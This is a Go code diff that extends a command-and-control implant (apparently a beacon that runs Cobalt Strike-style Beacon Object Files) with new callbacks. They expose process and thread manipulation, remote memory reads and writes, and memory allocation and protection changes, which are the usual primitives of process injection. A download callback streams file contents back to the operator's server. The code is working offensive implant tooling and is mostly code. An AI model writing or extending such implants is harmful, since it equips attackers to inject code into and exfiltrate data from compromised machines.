@@ -60,6 +60,28 @@ var (
 
 	currentToken     uintptr
 	currentTokenLock sync.Mutex
+
+	beaconDataLongCb              uintptr
+	beaconDataPtrCb               uintptr
+	beaconDownloadCb              uintptr
+	beaconVirtualAllocCb          uintptr
+	beaconVirtualProtectCb        uintptr
+	beaconVirtualFreeCb           uintptr
+	beaconOpenProcessCb           uintptr
+	beaconCloseHandleCb           uintptr
+	beaconGetThreadContextCb      uintptr
+	beaconSetThreadContextCb      uintptr
+	beaconResumeThreadCb          uintptr
+	beaconOpenThreadCb            uintptr
+	beaconReadProcessMemoryCb     uintptr
+	beaconWriteProcessMemoryCb    uintptr
+	beaconUnmapViewOfFileCb       uintptr
+	beaconVirtualQueryCb          uintptr
+	beaconDuplicateHandleCb       uintptr
+	beaconGetCustomUserDataCb     uintptr
+	beaconGetSyscallInformationCb uintptr
+
+	userDataBuf = make([]byte, 32)
 )
 
 type datap struct {
@@ -114,6 +136,28 @@ func initCallbacks() {
 		beaconCleanupProcCb = syscall.NewCallback(beaconCleanupProcessCallback)
 		beaconGetOutputDataCb = syscall.NewCallback(beaconGetOutputDataCallback)
 		beaconInformationCb = syscall.NewCallback(beaconInformationCallback)
+
+		beaconDataLongCb = syscall.NewCallback(beaconDataLongCallback)
+		beaconDataPtrCb = syscall.NewCallback(beaconDataPtrCallback)
+		beaconDownloadCb = syscall.NewCallback(beaconDownloadCallback)
+
+		beaconVirtualAllocCb = syscall.NewCallback(beaconVirtualAllocCallback)
+		beaconVirtualProtectCb = syscall.NewCallback(beaconVirtualProtectCallback)
+		beaconVirtualFreeCb = syscall.NewCallback(beaconVirtualFreeCallback)
+		beaconOpenProcessCb = syscall.NewCallback(beaconOpenProcessCallback)
+		beaconCloseHandleCb = syscall.NewCallback(beaconCloseHandleCallback)
+		beaconGetThreadContextCb = syscall.NewCallback(beaconGetThreadContextCallback)
+		beaconSetThreadContextCb = syscall.NewCallback(beaconSetThreadContextCallback)
+		beaconResumeThreadCb = syscall.NewCallback(beaconResumeThreadCallback)
+		beaconOpenThreadCb = syscall.NewCallback(beaconOpenThreadCallback)
+		beaconReadProcessMemoryCb = syscall.NewCallback(beaconReadProcessMemoryCallback)
+		beaconWriteProcessMemoryCb = syscall.NewCallback(beaconWriteProcessMemoryCallback)
+		beaconUnmapViewOfFileCb = syscall.NewCallback(beaconUnmapViewOfFileCallback)
+		beaconVirtualQueryCb = syscall.NewCallback(beaconVirtualQueryCallback)
+		beaconDuplicateHandleCb = syscall.NewCallback(beaconDuplicateHandleCallback)
+
+		beaconGetCustomUserDataCb = syscall.NewCallback(beaconGetCustomUserDataCallback)
+		beaconGetSyscallInformationCb = syscall.NewCallback(beaconGetSyscallInformationCallback)
 	})
 }
 
@@ -1153,6 +1197,44 @@ func GetBeaconCallback(name string) uintptr {
 		return beaconGetOutputDataCb
 	case "BeaconInformation":
 		return beaconInformationCb
+	case "BeaconDataLong":
+		return beaconDataLongCb
+	case "BeaconDataPtr":
+		return beaconDataPtrCb
+	case "BeaconDownload":
+		return beaconDownloadCb
+	case "BeaconVirtualAlloc":
+		return beaconVirtualAllocCb
+	case "BeaconVirtualProtect":
+		return beaconVirtualProtectCb
+	case "BeaconVirtualFree":
+		return beaconVirtualFreeCb
+	case "BeaconOpenProcess":
+		return beaconOpenProcessCb
+	case "BeaconCloseHandle":
+		return beaconCloseHandleCb
+	case "BeaconGetThreadContext":
+		return beaconGetThreadContextCb
+	case "BeaconSetThreadContext":
+		return beaconSetThreadContextCb
+	case "BeaconResumeThread":
+		return beaconResumeThreadCb
+	case "BeaconOpenThread":
+		return beaconOpenThreadCb
+	case "BeaconReadProcessMemory":
+		return beaconReadProcessMemoryCb
+	case "BeaconWriteProcessMemory":
+		return beaconWriteProcessMemoryCb
+	case "BeaconUnmapViewOfFile":
+		return beaconUnmapViewOfFileCb
+	case "BeaconVirtualQuery":
+		return beaconVirtualQueryCb
+	case "BeaconDuplicateHandle":
+		return beaconDuplicateHandleCb
+	case "BeaconGetCustomUserData":
+		return beaconGetCustomUserDataCb
+	case "BeaconGetSyscallInformation":
+		return beaconGetSyscallInformationCb
 	default:
 		return genericStubCb
 	}
@@ -1269,4 +1351,170 @@ func packWideStringArg(s string) ([]byte, error) {
 	binary.LittleEndian.PutUint32(result, uint32(len(buf)))
 	result = append(result, buf...)
 	return result, nil
+}
+
+func beaconDataLongCallback(parser uintptr) uintptr {
+	if parser == 0 {
+		return 0
+	}
+
+	p := (*datap)(unsafe.Pointer(parser))
+	if p.length < 8 || p.buffer == 0 {
+		return 0
+	}
+
+	val := *(*uint64)(unsafe.Pointer(p.buffer))
+
+	p.buffer += 8
+	p.length -= 8
+
+	return uintptr(val)
+}
+
+func beaconDataPtrCallback(parser uintptr, size int32) uintptr {
+	if parser == 0 {
+		return 0
+	}
+
+	p := (*datap)(unsafe.Pointer(parser))
+	if p.length < uint32(size) || p.buffer == 0 {
+		return 0
+	}
+
+	ptr := p.buffer
+
+	p.buffer += uintptr(size)
+	p.length -= uint32(size)
+
+	return ptr
+}
+
+func beaconDownloadCallback(filenamePtr uintptr, bufferPtr uintptr, length uint32) uintptr {
+	if filenamePtr == 0 || bufferPtr == 0 || length == 0 {
+		return 0
+	}
+
+	filename := readCString(filenamePtr)
+	data := unsafe.Slice((*byte)(unsafe.Pointer(bufferPtr)), length)
+
+	// We format the download as a special output application frame so the server can potentially parse it,
+	// or at least it's visible to the user.
+	// Format: [DOWNLOAD:filename:length]
+	// data...
+
+	header := fmt.Sprintf("\n[DOWNLOAD:%s:%d]\n", filename, length)
+
+	bofOutput.Lock()
+	defer bofOutput.Unlock()
+
+	if bofOutput.buf == nil {
+		return 0
+	}
+
+	remaining := len(bofOutput.buf) - bofOutput.len
+	if len(header) > remaining {
+		copy(bofOutput.buf[bofOutput.len:], header[:remaining])
+		bofOutput.len += remaining
+		return 1
+	}
+	copy(bofOutput.buf[bofOutput.len:], header)
+	bofOutput.len += len(header)
+	remaining = len(bofOutput.buf) - bofOutput.len
+	toCopy := int(length)
+	if toCopy > remaining {
+		toCopy = remaining
+	}
+
+	if toCopy > 0 {
+		copy(bofOutput.buf[bofOutput.len:], data[:toCopy])
+		bofOutput.len += toCopy
+	}
+
+	if bofOutput.len < len(bofOutput.buf) {
+		bofOutput.buf[bofOutput.len] = '\n'
+		bofOutput.len++
+	}
+
+	return 1
+}
+
+func beaconVirtualAllocCallback(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "VirtualAlloc", lpAddress, dwSize, uintptr(flAllocationType), uintptr(flProtect))
+	return ret
+}
+
+func beaconVirtualProtectCallback(lpAddress uintptr, dwSize uintptr, flNewProtect uint32, lpflOldProtect uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "VirtualProtect", lpAddress, dwSize, uintptr(flNewProtect), lpflOldProtect)
+	return ret
+}
+
+func beaconVirtualFreeCallback(lpAddress uintptr, dwSize uintptr, dwFreeType uint32) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "VirtualFree", lpAddress, dwSize, uintptr(dwFreeType))
+	return ret
+}
+
+func beaconOpenProcessCallback(dwDesiredAccess uint32, bInheritHandle int32, dwProcessId uint32) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "OpenProcess", uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwProcessId))
+	return ret
+}
+
+func beaconCloseHandleCallback(hObject uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "CloseHandle", hObject)
+	return ret
+}
+
+func beaconGetThreadContextCallback(hThread uintptr, lpContext uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "GetThreadContext", hThread, lpContext)
+	return ret
+}
+
+func beaconSetThreadContextCallback(hThread uintptr, lpContext uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "SetThreadContext", hThread, lpContext)
+	return ret
+}
+
+func beaconResumeThreadCallback(hThread uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "ResumeThread", hThread)
+	return ret
+}
+
+func beaconOpenThreadCallback(dwDesiredAccess uint32, bInheritHandle int32, dwThreadId uint32) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "OpenThread", uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwThreadId))
+	return ret
+}
+
+func beaconReadProcessMemoryCallback(hProcess uintptr, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesRead uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "ReadProcessMemory", hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead)
+	return ret
+}
+
+func beaconWriteProcessMemoryCallback(hProcess uintptr, lpBaseAddress uintptr, lpBuffer uintptr, nSize uintptr, lpNumberOfBytesWritten uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "WriteProcessMemory", hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
+	return ret
+}
+
+func beaconUnmapViewOfFileCallback(lpBaseAddress uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "UnmapViewOfFile", lpBaseAddress)
+	return ret
+}
+
+func beaconVirtualQueryCallback(lpAddress uintptr, lpBuffer uintptr, dwLength uintptr) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "VirtualQuery", lpAddress, lpBuffer, dwLength)
+	return ret
+}
+
+func beaconDuplicateHandleCallback(hSourceProcessHandle uintptr, hSourceHandle uintptr, hTargetProcessHandle uintptr, lpTargetHandle uintptr, dwDesiredAccess uint32, bInheritHandle int32, dwOptions uint32) uintptr {
+	ret, _, _ := wc.Call("kernel32.dll", "DuplicateHandle", hSourceProcessHandle, hSourceHandle, hTargetProcessHandle, lpTargetHandle, uintptr(dwDesiredAccess), uintptr(bInheritHandle), uintptr(dwOptions))
+	return ret
+}
+
+func beaconGetCustomUserDataCallback() uintptr {
+	// no op until needed maybe one day
+	return uintptr(unsafe.Pointer(&userDataBuf[0]))
+}
+
+func beaconGetSyscallInformationCallback(info uintptr, resolveIfNotInitialized int32) uintptr {
+	// we already resolve all syscalls for the beacon in the loading stage (stagers/loader),
+	// so this functions returns 0 (FALSE) as we don't need to expose internal syscall info to BOFs.
+	return 0
 }
